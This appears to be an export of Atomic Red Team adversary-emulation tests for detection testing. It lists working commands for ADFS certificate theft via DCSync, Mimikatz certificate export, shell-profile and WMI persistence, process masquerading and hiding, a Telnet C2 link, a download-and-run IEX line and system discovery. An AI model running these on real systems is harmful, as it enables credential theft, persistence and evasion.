nodes.name: ADFS token signing and encryption certificates theft - Local
nodes.description: Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server. Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.

nodes.name: Command for ADFS token signing and encryption certificates theft - Local
nodes.description: Import-Module AADInternals -Force Export-AADIntADFSCertificates Get-ChildItem | Where-Object {$_ -like "ADFS*"} Write-Host "`nCertificates retrieved successfully"

nodes.name: Cleanup for ADFS token signing and encryption certificates theft - Local
nodes.description: Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore

nodes.name: ADFS token signing and encryption certificates theft - Remote
nodes.description: Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer. Based on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.

nodes.name: Command for ADFS token signing and encryption certificates theft - Remote
nodes.description: Import-Module ActiveDirectory -Force Import-Module AADInternals -Force | Out-Null #Get Configuration $dcServerName = (Get-ADDomainController).HostName $svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq "#{adfs_service_account_name}" $PWord = ConvertTo-SecureString -String "#{replication_password}" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord # use DCSync to fetch the ADFS service account's NT hash $hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex $ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name} # Get certificates decryption key $Configuration = [xml]$ADFSConfig $group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group $container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName $parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn $base = "LDAP://CN=$group,$container,$parent" $ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)) $ADSearch.Filter = '(name=CryptoPolicy)' $ADSearch.PropertiesToLoad.Clear() $ADSearch.PropertiesToLoad.Add("displayName") | Out-Null $aduser = $ADSearch.FindOne() $keyObjectGuid = $ADUser.Properties["displayName"] $ADSearch.PropertiesToLoad.Clear() $ADSearch.PropertiesToLoad.Add("thumbnailphoto") | Out-Null $ADSearch.Filter="(l=$keyObjectGuid)" $aduser=$ADSearch.FindOne() $key=[byte[]]$aduser.Properties["thumbnailphoto"][0] # Get encrypted certificates from configuration and decrypt them Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key Get-ChildItem | Where-Object {$_ -like "ADFS*"} Write-Host "`nCertificates retrieved successfully"

nodes.name: Cleanup for ADFS token signing and encryption certificates theft - Remote
nodes.description: Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore

nodes.name: CertUtil ExportPFX
nodes.description: The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack. Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html

nodes.name: Command for CertUtil ExportPFX
nodes.description: IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) certutil.exe -p #{password} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 #{output}

nodes.name: Cleanup for CertUtil ExportPFX
nodes.description: Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item

nodes.name: Export Root Certificate with Export-PFXCertificate
nodes.description: Creates a Root certificate and exports it with Export-PFXCertificate PowerShell Cmdlet. Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-PFXCertificate.

nodes.name: Command for Export Root Certificate with Export-PFXCertificate
nodes.description: $mypwd = ConvertTo-SecureString -String "AtomicRedTeam" -Force -AsPlainText $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My Set-Location Cert:\LocalMachine\My Get-ChildItem -Path $cert.Thumbprint | Export-PfxCertificate -FilePath #{pfx_path} -Password $mypwd

nodes.name: Cleanup for Export Root Certificate with Export-PFXCertificate
nodes.description: try { $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore } catch { }

nodes.name: Export Root Certificate with Export-Certificate
nodes.description: Creates a Root certificate and exports it with Export-Certificate PowerShell Cmdlet. Upon a successful attempt, this will write a pfx to disk and utilize the Cmdlet Export-Certificate.

nodes.name: Command for Export Root Certificate with Export-Certificate
nodes.description: $cert = New-SelfSignedCertificate -DnsName atomicredteam.com -CertStoreLocation cert:\LocalMachine\My Set-Location Cert:\LocalMachine\My Export-Certificate -Type CERT -Cert Cert:\LocalMachine\My\$($cert.Thumbprint) -FilePath #{pfx_path}

nodes.name: Cleanup for Export Root Certificate with Export-Certificate
nodes.description: try { $cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My -ErrorAction Ignore Get-ChildItem Cert:\LocalMachine\My\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore Get-ChildItem Cert:\LocalMachine\Root\$($cert.Thumbprint) -ErrorAction Ignore | Remove-Item -ErrorAction Ignore } catch { }

nodes.name: Export Certificates with Mimikatz
nodes.description: The following Atomic test will utilize Mimikatz to extract the certificates from the local system My store. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands. A successful attempt will stdout the certificates and write multiple .pfx and .der files to disk.

nodes.name: Command for Export Certificates with Mimikatz
nodes.description: "#{mimikatz_exe}" "crypto::certificates /systemstore:local_machine /store:my /export" exit

nodes.name: Event Triggered Execution: .bash_profile .bashrc and .shrc
nodes.description: Atomic Red Team technique: Event Triggered Execution: .bash_profile .bashrc and .shrc

nodes.name: Add command to .bash_profile
nodes.description: Adds a command to the .bash_profile file of the current user

nodes.name: Command for Add command to .bash_profile
nodes.description: echo '#{command_to_add}' >> ~/.bash_profile

nodes.name: Cleanup for Add command to .bash_profile
nodes.description: head -n '-2' ~/.bash_profile > /tmp/T1546.004 mv /tmp/T1546.004 ~/.bash_profile

nodes.name: Add command to .bashrc
nodes.description: Adds a command to the .bashrc file of the current user

nodes.name: Command for Add command to .bashrc
nodes.description: echo '#{command_to_add}' >> ~/.bashrc

nodes.name: Cleanup for Add command to .bashrc
nodes.description: head -n '-2' ~/.bashrc > /tmp/T1546.004 mv /tmp/T1546.004 ~/.bashrc

nodes.name: Add command to .shrc
nodes.description: Adds a command to the .shrc file of the current user

nodes.name: Command for Add command to .shrc
nodes.description: echo '#{command_to_add}' >> ~/.shrc

nodes.name: Cleanup for Add command to .shrc
nodes.description: head -n '-2' ~/.shrc > /tmp/T1546.004 mv /tmp/T1546.004 ~/.shrc

nodes.name: Append to the system shell profile
nodes.description: An adversary may wish to establish persistence by executing malicious commands from the systems /etc/profile every time "any" user logs in.

nodes.name: Command for Append to the system shell profile
nodes.description: echo '#{text_to_append}' >> /etc/profile

nodes.name: Cleanup for Append to the system shell profile
nodes.description: sed -i "s/# Atomic Red Team was here! T1546.004//" /etc/profile

nodes.name: Append commands user shell profile
nodes.description: An adversary may wish to establish persistence by executing malicious commands from the users ~/.profile every time the "user" logs in.

nodes.name: Command for Append commands user shell profile
nodes.description: echo '#{text_to_append}' >> ~/.profile

nodes.name: Cleanup for Append commands user shell profile
nodes.description: sed -i "s/# Atomic Red Team was here... T1546.004//" ~/.profile

nodes.name: System shell profile scripts
nodes.description: An adversary may wish to establish persistence by adding commands into any of the script files in the /etc/profile.d/ directory, which are executed every time "any" user logs in.

nodes.name: Command for System shell profile scripts
nodes.description: echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh

nodes.name: Cleanup for System shell profile scripts
nodes.description: sed -i "s/# Atomic Red Team was here... T1546.004//" /etc/profile.d/bash_completion.sh

nodes.name: Create/Append to .bash_logout
nodes.description: The Bash shell runs ~/.bash_logout "if it exists" to run commands on user logout. An adversary may create or append to a .bash_logout to clear history, start processes etc. Note the ~/.bash_logout is only run if you explicitly exit or log out of an "interactive login shell session" i.e. via the console, SSH, /bin/bash -l or su -l <username>. This test creates the art user, logs in, creates a .bash_logout which will echo some text into the art.txt file on logout and logs out and the /home/art/art.txt is created.

nodes.name: Command for Create/Append to .bash_logout
nodes.description: useradd --create-home --shell /bin/bash art su -l art -c "echo 'echo \"Atomic Red Team was here... T1546.004\" >> /home/art/art.txt' >> /home/art/.bash_logout; exit"

nodes.name: Cleanup for Create/Append to .bash_logout
nodes.description: userdel -fr art

nodes.name: Masquerading: Rename System Utilities
nodes.description: Atomic Red Team technique: Masquerading: Rename System Utilities

nodes.name: Masquerading as Windows LSASS process
nodes.description: Copies cmd.exe, renames it, and launches it to masquerade as an instance of lsass.exe. Upon execution, cmd will be launched by powershell. If using Invoke-AtomicTest, The test will hang until the 120 second timeout cancels the session

nodes.name: Command for Masquerading as Windows LSASS process
nodes.description: copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe %SystemRoot%\Temp\lsass.exe /B

nodes.name: Cleanup for Masquerading as Windows LSASS process
nodes.description: del /Q /F %SystemRoot%\Temp\lsass.exe >nul 2>&1

nodes.name: Masquerading as FreeBSD or Linux crond process.
nodes.description: Copies sh process, renames it as crond, and executes it to masquerade as the cron daemon. Upon successful execution, sh is renamed to `crond` and executed.

nodes.name: Command for Masquerading as FreeBSD or Linux crond process.
nodes.description: cp /bin/sh /tmp/crond; echo 'sleep 5' | /tmp/crond

nodes.name: Cleanup for Masquerading as FreeBSD or Linux crond process.
nodes.description: rm /tmp/crond

nodes.name: Masquerading - cscript.exe running as notepad.exe
nodes.description: Copies cscript.exe, renames it, and launches it to masquerade as an instance of notepad.exe. Upon successful execution, cscript.exe is renamed as notepad.exe and executed from non-standard path.

nodes.name: Command for Masquerading - cscript.exe running as notepad.exe
nodes.description: copy %SystemRoot%\System32\cscript.exe %APPDATA%\notepad.exe /Y cmd.exe /c %APPDATA%\notepad.exe /B

nodes.name: Cleanup for Masquerading - cscript.exe running as notepad.exe
nodes.description: del /Q /F %APPDATA%\notepad.exe >nul 2>&1

nodes.name: Masquerading - wscript.exe running as svchost.exe
nodes.description: Copies wscript.exe, renames it, and launches it to masquerade as an instance of svchost.exe. Upon execution, no windows will remain open but wscript will have been renamed to svchost and ran out of the temp folder

nodes.name: Command for Masquerading - wscript.exe running as svchost.exe
nodes.description: copy %SystemRoot%\System32\wscript.exe %APPDATA%\svchost.exe /Y cmd.exe /c %APPDATA%\svchost.exe "PathToAtomicsFolder\..\ExternalPayloads\T1036.003\src\T1036.003_masquerading.vbs"

nodes.name: Cleanup for Masquerading - wscript.exe running as svchost.exe
nodes.description: del /Q /F %APPDATA%\svchost.exe >nul 2>&1

nodes.name: Masquerading - powershell.exe running as taskhostw.exe
nodes.description: Copies powershell.exe, renames it, and launches it to masquerade as an instance of taskhostw.exe. Upon successful execution, powershell.exe is renamed as taskhostw.exe and executed from non-standard path.

nodes.name: Command for Masquerading - powershell.exe running as taskhostw.exe
nodes.description: copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y cmd.exe /K %APPDATA%\taskhostw.exe

nodes.name: Cleanup for Masquerading - powershell.exe running as taskhostw.exe
nodes.description: del /Q /F %APPDATA%\taskhostw.exe >nul 2>&1

nodes.name: Masquerading - non-windows exe running as windows exe
nodes.description: Copies an exe, renames it as a windows exe, and launches it to masquerade as a real windows exe Upon successful execution, powershell will execute T1036.003.exe as svchost.exe from on a non-standard path.

nodes.name: Command for Masquerading - non-windows exe running as windows exe
nodes.description: copy "#{inputfile}" #{outputfile} try { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id } catch { $_; exit $_.Exception.HResult} Stop-Process -ID $myT1036_003

nodes.name: Cleanup for Masquerading - non-windows exe running as windows exe
nodes.description: Remove-Item #{outputfile} -Force -ErrorAction Ignore

nodes.name: Masquerading - windows exe running as different windows exe
nodes.description: Copies a windows exe, renames it as another windows exe, and launches it to masquerade as second windows exe

nodes.name: Command for Masquerading - windows exe running as different windows exe
nodes.description: copy "#{inputfile}" #{outputfile} $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id Stop-Process -ID $myT1036_003

nodes.name: Cleanup for Masquerading - windows exe running as different windows exe
nodes.description: Remove-Item #{outputfile} -Force -ErrorAction Ignore

nodes.name: Malicious process Masquerading as LSM.exe
nodes.description: Detect LSM running from an incorrect directory and an incorrect service account This works by copying cmd.exe to a file, naming it lsm.exe, then copying a file to the C:\ folder. Upon successful execution, cmd.exe will be renamed as lsm.exe and executed from non-standard path.

nodes.name: Command for Malicious process Masquerading as LSM.exe
nodes.description: copy C:\Windows\System32\cmd.exe C:\lsm.exe C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt

nodes.name: Cleanup for Malicious process Masquerading as LSM.exe
nodes.description: del C:\T1036.003.txt >nul 2>&1 del C:\lsm.exe >nul 2>&1

nodes.name: System Network Connections Discovery
nodes.description: Atomic Red Team technique: System Network Connections Discovery

nodes.name: System Network Connections Discovery
nodes.description: Get a listing of network connections. Upon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. `net sessions` requires elevated privileges; on standard user accounts this command may not return results. Results will output via stdout.

nodes.name: Command for System Network Connections Discovery
nodes.description: netstat -ano net use net sessions 2>nul

nodes.name: System Network Connections Discovery with PowerShell
nodes.description: Get a listing of network connections. Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.

nodes.name: Command for System Network Connections Discovery with PowerShell
nodes.description: Get-NetTCPConnection

nodes.name: System Network Connections Discovery via PowerShell (Process Mapping)
nodes.description: Enumerate TCP connections and map to owning process names via PowerShell.

nodes.name: Command for System Network Connections Discovery via PowerShell (Process Mapping)
nodes.description: Get-NetTCPConnection | ForEach-Object { $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue [pscustomobject]@{ Local = "$($_.LocalAddress):$($_.LocalPort)" Remote = "$($_.RemoteAddress):$($_.RemotePort)" State = $_.State PID = $_.OwningProcess Process = if ($p) { $p.ProcessName } else { $null } } } | Sort-Object State,Process | Format-Table -AutoSize

nodes.name: System Network Connections Discovery via ss or lsof (Linux/MacOS)
nodes.description: List active TCP/UDP network connections using ss, with lsof as a fallback when ss is unavailable. Serves as an alternative to the netstat-based test.

nodes.name: Command for System Network Connections Discovery via ss or lsof (Linux/MacOS)
nodes.description: if command -v ss >/dev/null 2>&1; then ss -antp 2>/dev/null || ss -ant; ss -aunp 2>/dev/null || true; else lsof -i -nP 2>/dev/null || true; fi

nodes.name: System Network Connections Discovery FreeBSD, Linux & MacOS
nodes.description: Get a listing of network connections. Upon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.

nodes.name: Command for System Network Connections Discovery FreeBSD, Linux & MacOS
nodes.description: netstat who -a

nodes.name: System Network Connections Discovery via sockstat (Linux, FreeBSD)
nodes.description: Enumerate IPv4/IPv6 network endpoints on FreeBSD using sockstat.

nodes.name: Command for System Network Connections Discovery via sockstat (Linux, FreeBSD)
nodes.description: sockstat -4 sockstat -6 2>/dev/null || true sockstat -l 2>/dev/null || true

nodes.name: System Discovery using SharpView
nodes.description: Get a listing of network connections, domains, domain users, and etc. sharpview.exe located in the bin folder, an opensource red-team tool. Upon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.

nodes.name: Command for System Discovery using SharpView
nodes.description: $syntaxList = #{syntax} foreach ($syntax in $syntaxList) { #{SharpView} $syntax -}

nodes.name: System Information Discovery
nodes.description: Atomic Red Team technique: System Information Discovery

nodes.name: System Information Discovery
nodes.description: Identify System Info. Upon execution, system info and time info will be displayed.

nodes.name: Command for System Information Discovery
nodes.description: systeminfo reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum

nodes.name: System Information Discovery
nodes.description: Identify System Info

nodes.name: Command for System Information Discovery
nodes.description: system_profiler ls -al /Applications

nodes.name: List OS Information
nodes.description: Identify System Info

nodes.name: Command for List OS Information
nodes.description: uname -a >> #{output_file} if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi if [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi if [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi uptime >> #{output_file} cat #{output_file} 2>/dev/null

nodes.name: Cleanup for List OS Information
nodes.description: rm #{output_file} 2>/dev/null

nodes.name: Linux VM Check via Hardware
nodes.description: Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.

nodes.name: Command for Linux VM Check via Hardware
nodes.description: if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi if [ -f /sys/class/dmi/id/chassis_vendor ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi

nodes.name: Azure Security Scan with SkyArk
nodes.description: Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. Once the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. See https://github.com/cyberark/SkyArk

nodes.name: Command for Azure Security Scan with SkyArk
nodes.description: Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password Connect-AzAccount -Credential $Credential Connect-AzureAD -Credential $Credential Scan-AzureAdmins -UseCurrentCred

nodes.name: Cleanup for Azure Security Scan with SkyArk
nodes.description: $resultstime = Get-Date -Format "yyyyMMdd" $resultsfolder = ("Results-" + $resultstime) remove-item $env:temp\$resultsfolder -recurse -force -erroraction silentlycontinue

nodes.name: System Information Discovery with WMIC
nodes.description: Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions. https://nwgat.ninja/getting-system-information-with-wmic-on-windows/ Elements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting: https://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar https://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/

nodes.name: Command for System Information Discovery with WMIC
nodes.description: wmic cpu get name wmic MEMPHYSICAL get MaxCapacity wmic baseboard get product wmic baseboard get version wmic bios get SMBIOSBIOSVersion wmic path win32_VideoController get name wmic path win32_VideoController get DriverVersion wmic path win32_VideoController get VideoModeDescription wmic OS get Caption,OSArchitecture,Version wmic DISKDRIVE get Caption Get-WmiObject win32_bios

nodes.name: System Information Discovery

nodes.name: linux rename /proc/pid/comm using prctl
nodes.description: Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to "totally_legit". This will show up as process name in simple 'ps' listings.

nodes.name: Command for linux rename /proc/pid/comm using prctl
nodes.description: #{exe_path} & ps TMP=`ps | grep totally_legit` if [ -z "${TMP}" ] ; then echo "renamed process NOT FOUND in process list" && exit 1; fi exit 0

nodes.name: Cleanup for linux rename /proc/pid/comm using prctl
nodes.description: rm -f #{exe_path}

nodes.name: Hiding a malicious process with bind mounts
nodes.description: Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process

nodes.name: Command for Hiding a malicious process with bind mounts
nodes.description: eval '(while true; do :; done) &' echo $! > /tmp/evil_pid.txt random_kernel_pid=$(ps -ef | grep "\[.*\]" | awk '{print $2}' | shuf -n 1) sudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)

nodes.name: Cleanup for Hiding a malicious process with bind mounts
nodes.description: kill $(cat /tmp/evil_pid.txt) || echo "Failed to kill PID $evil_pid" rm /tmp/evil_pid.txt

nodes.name: Event Triggered Execution: Windows Management Instrumentation Event Subscription
nodes.description: Atomic Red Team technique: Event Triggered Execution: Windows Management Instrumentation Event Subscription

nodes.name: Persistence via WMI Event Subscription - CommandLineEventConsumer
nodes.description: Run from an administrator powershell window. After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM. Code references https://gist.github.com/mattifestation/7fe1df7ca2f08cbfa3d067def00c01af https://github.com/EmpireProject/Empire/blob/master/data/module_source/persistence/Persistence.psm1#L545

nodes.name: Command for Persistence via WMI Event Subscription - CommandLineEventConsumer
nodes.description: $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'; CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";} $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs $FilterToConsumerArgs = @{ Filter = [Ref] $Filter; Consumer = [Ref] $Consumer; } $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs

nodes.name: Cleanup for Persistence via WMI Event Subscription - CommandLineEventConsumer
nodes.description: $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'" $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'" $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue $FilterConsumerBindingToCleanup | Remove-WmiObject $EventConsumerToCleanup | Remove-WmiObject $EventFilterToCleanup | Remove-WmiObject

nodes.name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
nodes.description: Run from an administrator powershell window. After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM. Code references https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c

nodes.name: Command for Persistence via WMI Event Subscription - ActiveScriptEventConsumer
nodes.description: $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'; EventNameSpace='root\CimV2'; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"}; $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'; ScriptingEngine='VBScript'; ScriptText=' Set objws = CreateObject("Wscript.Shell") objws.Run "notepad.exe", 0, True '} $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs $FilterToConsumerArgs = @{ Filter = $Filter; Consumer = $Consumer; } $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs

nodes.name: Cleanup for Persistence via WMI Event Subscription - ActiveScriptEventConsumer
nodes.description: $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'" $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'" $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue $FilterConsumerBindingToCleanup | Remove-WmiObject $EventConsumerToCleanup | Remove-WmiObject $EventFilterToCleanup | Remove-WmiObject

nodes.name: Windows MOFComp.exe Load MOF File
nodes.description: The following Atomic will utilize MOFComp.exe to load a local MOF file. The Managed Object Format (MOF) compiler parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository. To query for the class: gwmi __eventfilter -namespace root\subscription A successful execution will add the class to WMI root namespace. Reference: https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/.

nodes.name: Command for Windows MOFComp.exe Load MOF File
nodes.description: #{mofcomp_path} "#{mof_file}"

nodes.name: Cleanup for Windows MOFComp.exe Load MOF File
nodes.description: $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam_consumer'" $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam_filter'" $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue $FilterConsumerBindingToCleanup | Remove-WmiObject $EventConsumerToCleanup | Remove-WmiObject $EventFilterToCleanup | Remove-WmiObject

nodes.description: An adversary may establish Telnet communication from a compromised endpoint to a command and control (C2) server in order to carry out additional attacks on objectives.

nodes.name: Command for Telnet C2
nodes.description: #{client_path} #{server_ip} --port #{server_port}

nodes.name: Data from Removable Media
nodes.description: Atomic Red Team technique: Data from Removable Media

nodes.name: Identify Documents on USB and Removable Media via PowerShell
nodes.description: This test simulates an attack where PowerShell is used to detect connected USB or other removable storage devices and gather a list of specific document files (e.g., .docx, .xls, .txt, .pdf). The command works by first identifying removable drives on the system and then recursively searching through each one for files matching the targeted extensions. If no removable drives are present, the script will return a message stating that no media is detected. This behavior mimics how adversaries might scan for sensitive documents on removable devices for exfiltration or analysis.

nodes.name: Command for Identify Documents on USB and Removable Media via PowerShell
nodes.description: powershell.exe -c "Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($_.DriveLetter + ':\*') -Recurse -Include '*.doc*','*.xls*','*.txt','*.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $_.FullName} } ; if (-not (Get-Volume | Where-Object {$_.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }"

nodes.name: Browser Bookmark Discovery
nodes.description: Atomic Red Team technique: Browser Bookmark Discovery

nodes.name: List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux
nodes.description: Searches for Mozilla Firefox's places.sqlite file (on FreeBSD or Linux distributions) that contains bookmarks and lists any found instances to a text file.

nodes.name: Command for List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux
nodes.description: find / -path "*.mozilla/firefox/*/places.sqlite" 2>/dev/null -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null

nodes.name: Cleanup for List Mozilla Firefox Bookmark Database Files on FreeBSD/Linux
nodes.description: rm -f #{output_file} 2>/dev/null

nodes.name: List Mozilla Firefox Bookmark Database Files on macOS
nodes.description: Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.

nodes.name: Command for List Mozilla Firefox Bookmark Database Files on macOS
nodes.description: find / -path "*/Firefox/Profiles/*/places.sqlite" -exec echo {} >> #{output_file} \; cat #{output_file} 2>/dev/null

nodes.name: Cleanup for List Mozilla Firefox Bookmark Database Files on macOS
nodes.description: rm -f #{output_file} 2>/dev/null

nodes.name: List Google Chrome Bookmark JSON Files on macOS

nodes.name: Cleanup for List Google Chrome Bookmark JSON Files on macOS

nodes.name: List Google Chrome / Opera Bookmarks on Windows with powershell
